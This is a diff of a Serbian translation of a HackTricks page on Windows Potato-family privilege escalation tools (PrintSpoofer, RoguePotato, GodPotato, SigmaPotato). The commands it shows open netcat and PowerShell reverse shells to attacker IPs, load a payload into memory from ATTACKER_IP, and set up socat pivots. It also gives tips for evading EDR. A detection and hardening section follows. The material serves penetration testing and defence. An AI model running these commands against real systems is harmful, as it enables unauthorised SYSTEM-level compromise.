@@ -3,10 +3,10 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 > [!WARNING]
-> **JuicyPotato doesn't work** na Windows Server 2019 i Windows 10 build 1809 i novijim. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** mogu se koristiti da **iskoriste iste privilegije i dobiju pristup na nivou `NT AUTHORITY\SYSTEM`**. Ovaj [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) detaljno objašnjava alat `PrintSpoofer`, koji se može koristiti za zloupotrebu impersonation privilegija na Windows 10 i Server 2019 hostovima gde JuicyPotato više ne radi.
+> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) detaljno objašnjava `PrintSpoofer` alat, koji se može koristiti za zloupotrebu privilegija impersonacije na Windows 10 i Server 2019 hostovima gde JuicyPotato više ne radi.
 
 > [!TIP]
-> Moderna alternativa, često održavana u 2024–2025, je SigmaPotato (fork GodPotato) koja dodaje upotrebu in-memory/.NET reflection i proširenu podršku za OS. Pogledajte brzu upotrebu ispod i repo u odeljku References.
+> Moderan alternativ koji se često održava u 2024–2025 je SigmaPotato (fork GodPotato) koji dodaje upotrebu in-memory/.NET reflection i proširenu podršku za OS. Vidi brzu upotrebu dole i repozitorijum u referencama.
 
 Related pages for background and manual techniques:
 
@@ -22,25 +22,25 @@ from-high-integrity-to-system-with-name-pipes.md
 privilege-escalation-abusing-tokens.md
 {{#endref}}
 
-## Zahtevi i uobičajene zamke
+## Zahtevi i česti problemi
 
-Sve sledeće tehnike se oslanjaju na zloupotrebu privilegovanog servisa koji podržava impersonation iz konteksta koji poseduje jednu od sledećih privilegija:
+Sve sledeće tehnike zasnivaju se na zloupotrebi privilegisanog servisa koji može da izvrši impersonaciju, iz konteksta koji ima jednu od sledećih privilegija:
 
-- SeImpersonatePrivilege (najčešći) ili SeAssignPrimaryTokenPrivilege
-- Povišen nivo integriteta nije potreban ako token već ima SeImpersonatePrivilege (tipično za mnoge servisne naloge kao što su IIS AppPool, MSSQL, itd.)
+- SeImpersonatePrivilege (najčešća) ili SeAssignPrimaryTokenPrivilege
+- Visok integritet nije potreban ako token već ima SeImpersonatePrivilege (tipično za mnoge servisne naloge kao što su IIS AppPool, MSSQL, itd.)
 
-Brzo proverite privilegije:
+Brza provera privilegija:
 ```cmd
 whoami /priv | findstr /i impersonate
 ```
 Operativne napomene:
 
-- PrintSpoofer zahteva da je servis Print Spooler pokrenut i dostupan preko lokalne RPC krajnje tačke (spoolss). U ojačanim okruženjima gde je Spooler onemogućen nakon PrintNightmare, preferirajte RoguePotato/GodPotato/DCOMPotato/EfsPotato.
-- RoguePotato zahteva OXID resolver dostupan na TCP/135. Ako je izlazni saobraćaj (egress) blokiran, koristite redirector/port-forwarder (vidi primer ispod). Starije verzije su zahtevale -f flag.
-- EfsPotato/SharpEfsPotato zloupotrebljavaju MS-EFSR; ako je jedan pipe blokiran, probajte alternativne pipe-ove (lsarpc, efsrpc, samr, lsass, netlogon).
-- Greška 0x6d3 tokom RpcBindingSetAuthInfo obično ukazuje na nepoznatu/nepodržanu RPC autentikacionu uslugu; probajte drugi pipe/transport ili se uverite da je ciljna usluga pokrenuta.
+- PrintSpoofer zahteva da Print Spooler service radi i bude dostupan preko lokalnog RPC endpoint-a (spoolss). U ojačanim sredinama gde je Spooler onemogućen nakon PrintNightmare, preferirajte RoguePotato/GodPotato/DCOMPotato/EfsPotato.
+- RoguePotato zahteva OXID resolver dostupan na TCP/135. Ako je egress blokiran, koristite redirector/port-forwarder (see example below). Starije build-ove je trebalo pokretati sa -f flag.
+- EfsPotato/SharpEfsPotato iskorišćavaju MS-EFSR; ako je jedan pipe blokiran, probajte alternativne pipe (lsarpc, efsrpc, samr, lsass, netlogon).
+- Error 0x6d3 tokom RpcBindingSetAuthInfo obično ukazuje na nepoznat/unsupported RPC authentication service; pokušajte drugi pipe/transport ili osigurajte da ciljna usluga radi.
 
-## Quick Demo
+## Brzi demo
 
 ### PrintSpoofer
 ```bash
@@ -58,8 +58,8 @@ NULL
 
 ```
 Napomene:
-- Možete koristiti -i da pokrenete interaktivni proces u tekućoj konzoli, ili -c da pokrenete one-liner.
-- Zahteva Spooler service. Ako je onemogućen, ovo neće uspeti.
+- Možete koristiti -i da pokrenete interaktivni proces u trenutnoj konzoli, ili -c da izvršite jednolinijsku komandu.
+- Zahteva Spooler servis. Ako je onemogućen, ovo neće uspeti.
 
 ### RoguePotato
 ```bash
@@ -67,7 +67,7 @@ c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l
 # In some old versions you need to use the "-f" param
 c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
 ```
-Ako je outbound 135 blokiran, pivot OXID resolver preko socat na vašem redirectoru:
+Ako je outbound 135 blokiran, pivot-ujte OXID resolver preko socat na svom redirectoru:
 ```bash
 # On attacker redirector (must listen on TCP/135 and forward to victim:9999)
 socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
@@ -111,7 +111,7 @@ CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes su
 
 nt authority\system
 ```
-Savet: Ako jedan pipe zakaže ili ga EDR blokira, pokušajte ostale podržane pipes:
+Savet: Ako jedan pipe zakaže ili EDR ga blokira, pokušajte sa drugim podržanim pipe-ovima:
 ```text
 EfsPotato <cmd> [pipe]
 pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
@@ -123,13 +123,13 @@ pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
 > GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 ```
 Napomene:
-- Radi na Windows 8/8.1–11 i Server 2012–2022 kada je prisutan SeImpersonatePrivilege.
+- Radi na Windows 8/8.1–11 i Server 2012–2022 kada je prisutno SeImpersonatePrivilege.
 
 ### DCOMPotato
 
 ![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)
 
-DCOMPotato pruža dve varijante koje ciljaju service DCOM objects koji su podrazumevano podešeni na RPC_C_IMP_LEVEL_IMPERSONATE. Sastavite ili koristite priložene binarne fajlove i pokrenite svoju naredbu:
+DCOMPotato nudi dve varijante koje ciljaju servisne DCOM objekte koji podrazumevano koriste RPC_C_IMP_LEVEL_IMPERSONATE. Kompajlirajte ili koristite priložene binarne fajlove i pokrenite svoju komandu:
 ```cmd
 # PrinterNotify variant
 PrinterNotifyPotato.exe "cmd /c whoami"
@@ -139,7 +139,7 @@ McpManagementPotato.exe "cmd /c whoami"
 ```
 ### SigmaPotato (ažurirani fork GodPotato)
 
-SigmaPotato dodaje moderne pogodnosti kao što su in-memory izvršavanje putem .NET reflection i PowerShell reverse shell helper.
+SigmaPotato dodaje moderne pogodnosti kao što su in-memory execution putem .NET reflection i PowerShell reverse shell helper.
 ```powershell
 # Load and execute from memory (no disk touch)
 [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
@@ -148,13 +148,13 @@ SigmaPotato dodaje moderne pogodnosti kao što su in-memory izvršavanje putem .
 # Or ask it to spawn a PS reverse shell
 [SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
 ```
-## Otkrivanje i mere za jačanje bezbednosti
+## Beleške o detekciji i ojačavanju
 
-- Pratite procese koji kreiraju named pipes i odmah pozivaju token-duplication APIs, nakon čega slede CreateProcessAsUser/CreateProcessWithTokenW. Sysmon može prikazati korisnu telemetriju: Event ID 1 (process creation), 17/18 (named pipe created/connected), i komandne linije koje pokreću podprocese kao SYSTEM.
-- Ojačavanje Spooler-a: Onemogućavanje Print Spooler servisa na serverima gde nije potreban sprečava lokalne zloupotrebe u stilu PrintSpoofer-a putem spoolss.
-- Ojačavanje naloga servisa: Smanjite dodeljivanje SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege prilagođenim servisima. Razmislite o pokretanju servisa pod virtualnim nalozima sa najmanjim potrebnim privilegijama i o izolovanju koristeći service SID i write-restricted tokens gde je moguće.
-- Mrežne kontrole: Blokiranje outbound TCP/135 ili ograničavanje RPC endpoint mapper saobraćaja može onemogućiti RoguePotato osim ako nije dostupan interni redirector.
-- EDR/AV: Svi ovi alati su široko prepoznatljivi po potpisima. Rekompajliranje iz izvornog koda, preimenovanje simbola/stringova ili korišćenje izvršavanja u memoriji može smanjiti detekciju, ali neće zaobići robusne detekcije zasnovane na ponašanju.
+- Pratite procese koji kreiraju named pipes i odmah pozivaju token-duplication APIs, a potom CreateProcessAsUser/CreateProcessWithTokenW. Sysmon može prikazati korisnu telemetriju: Event ID 1 (kreiranje procesa), 17/18 (named pipe kreiran/povezan) i komandne linije koje pokreću child procese kao SYSTEM.
+- Spooler hardening: Onemogućavanje Print Spooler servisa na serverima gde nije potreban sprečava PrintSpoofer-style lokalne eskalacije putem spoolss.
+- Service account hardening: Smanjite dodeljivanje SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege prilagođenim servisima. Razmotrite pokretanje servisa pod virtualnim nalozima sa najmanje potrebnih privilegija i njihovo izolovanje koristeći service SID i write-restricted tokene kad je to moguće.
+- Network controls: Blokiranje outbound TCP/135 ili ograničavanje RPC endpoint mapper saobraćaja može onemogućiti RoguePotato osim ako nije dostupan interni redirector.
+- EDR/AV: Svi ovi alati su široko detektovani po potpisima. Rekompajliranje iz izvornog koda, preimenovanje simbola/stringova ili izvođenje u memoriji može smanjiti detekciju, ali neće pobediti pouzdane detekcije zasnovane na ponašanju.
 
 ## References
 
